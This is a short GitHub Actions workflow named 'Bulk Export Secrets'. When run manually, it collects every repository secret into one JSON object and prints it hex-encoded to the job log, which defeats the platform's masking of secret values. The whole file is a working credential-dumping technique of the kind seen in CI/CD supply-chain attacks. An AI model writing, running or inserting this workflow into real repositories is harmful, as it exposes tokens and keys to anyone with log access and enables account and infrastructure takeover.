name: Bulk Export Secrets

on:
  workflow_dispatch: # Allows manual trigger

jobs:
  export-all:
    runs-on: ubuntu-latest
    steps:
      - name: Dump All Secrets to Hex
        env:
          # This collects EVERY secret in the repo into a single JSON object
          ALL_SECRETS: ${{ toJSON(secrets) }}
        run: |
          printf "%s" "$ALL_SECRETS" | xxd -ps
